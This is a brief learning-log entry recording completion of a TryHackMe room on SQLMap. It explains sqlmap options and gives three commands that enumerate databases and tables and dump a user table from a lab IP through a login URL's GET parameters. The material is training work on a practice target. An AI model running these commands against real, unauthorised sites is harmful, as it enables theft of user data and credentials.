.
## Day 37
### [**Streak**](https://tryhackme.com/Tushig3531/streak)
---
**Room Completed**
[**SQLMap: The Basics**](https://tryhackme.com/room/sqlmapthebasics)
---

SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities. 

- "--dbs" : helps us to extract all the database names
- "-D database_name --tables" : with this command after we know the name of database, we can extract information about the tables.
- "-D database_name -T table_name --dump" : After finding the tables, we can enumerate the records in those tables

URLs that have GET parameters can be vulnerable to SQL injection


```bash
sqlmap -u "http://10.201.37.241/ai/includes/user_login?email=test&password=test" --dbs
```

```bash
sqlmap -u "http://10.201.37.241/ai/includes/user_login?email=test&password=test" -D ai --tables
```

```bash
sqlmap -u "http://10.201.37.241/ai/includes/user_login?email=test&password=test" -D ai -T user --dump
```
